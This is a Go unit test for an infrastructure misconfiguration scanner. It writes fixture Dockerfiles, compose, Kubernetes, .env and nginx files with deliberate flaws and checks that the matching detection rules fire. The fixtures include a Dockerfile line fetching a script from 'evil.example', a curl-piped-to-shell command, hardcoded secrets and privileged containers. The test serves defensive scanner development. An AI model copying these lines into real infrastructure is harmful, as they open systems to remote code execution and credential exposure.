package analyzer

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanInfra(t *testing.T) {
	dir := t.TempDir()
	write := func(name, body string) {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	write("Dockerfile", "FROM node:latest\nUSER root\nENV DB_PASSWORD=supersecret123\nADD https://evil.example/x.sh /x.sh\nRUN curl -fsSL https://get.example.com | sh\n")
	write("docker-compose.yml", "services:\n  db:\n    image: mysql:8\n    privileged: true\n    network_mode: host\n    ports:\n      - \"3306:3306\"\n")
	write(".env", "APP_DEBUG=true\nAPI_KEY=abcd1234efgh5678\n")
	write(".env.example", "API_KEY=your_api_key_here\n") // template -> ignored
	write("k8s/pod.yaml", "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - image: myapp:latest\n      securityContext:\n        privileged: true\n  volumes:\n    - name: v\n      hostPath:\n        path: /var\n")
	write("nginx.conf", "server {\n  autoindex on;\n  server_tokens on;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n}\n")
	write("safe.Dockerfile", "FROM node:20.11-alpine\nUSER app\n") // should not flag

	issues, scanned := scanInfra(dir)
	if scanned < 6 {
		t.Fatalf("expected >=6 infra files scanned, got %d", scanned)
	}

	got := map[string]int{}
	for _, is := range issues {
		if is.Category != infraCategory {
			t.Errorf("issue %s has category %q, want Infrastructure", is.RuleID, is.Category)
		}
		got[is.RuleID]++
	}

	wantPresent := []string{
		"DOCKER_LATEST_TAG", "DOCKER_USER_ROOT", "DOCKER_SECRET_ENV", "DOCKER_ADD_REMOTE", "DOCKER_CURL_PIPE_SH",
		"COMPOSE_PRIVILEGED", "COMPOSE_HOST_NETWORK", "COMPOSE_DB_PORT_EXPOSED",
		"ENV_APP_DEBUG", "ENV_SECRET_COMMITTED",
		"K8S_LATEST_IMAGE", "K8S_PRIVILEGED", "K8S_HOSTPATH",
		"NGINX_AUTOINDEX", "WEB_SERVER_TOKENS", "WEB_OLD_TLS",
	}
	for _, id := range wantPresent {
		if got[id] == 0 {
			t.Errorf("expected rule %s to fire, but it did not", id)
		}
	}

	// safe.Dockerfile (pinned base + non-root) must not add USER/latest findings
	// beyond the ones from the unsafe Dockerfile.
	if got["DOCKER_USER_ROOT"] != 1 {
		t.Errorf("DOCKER_USER_ROOT fired %d times, want exactly 1 (safe.Dockerfile must not trip it)", got["DOCKER_USER_ROOT"])
	}
	if got["DOCKER_LATEST_TAG"] != 1 {
		t.Errorf("DOCKER_LATEST_TAG fired %d times, want exactly 1", got["DOCKER_LATEST_TAG"])
	}
	// .env.example is a template and must not produce a committed-secret finding.
	if got["ENV_SECRET_COMMITTED"] != 1 {
		t.Errorf("ENV_SECRET_COMMITTED fired %d times, want exactly 1 (.env.example must be ignored)", got["ENV_SECRET_COMMITTED"])
	}
}
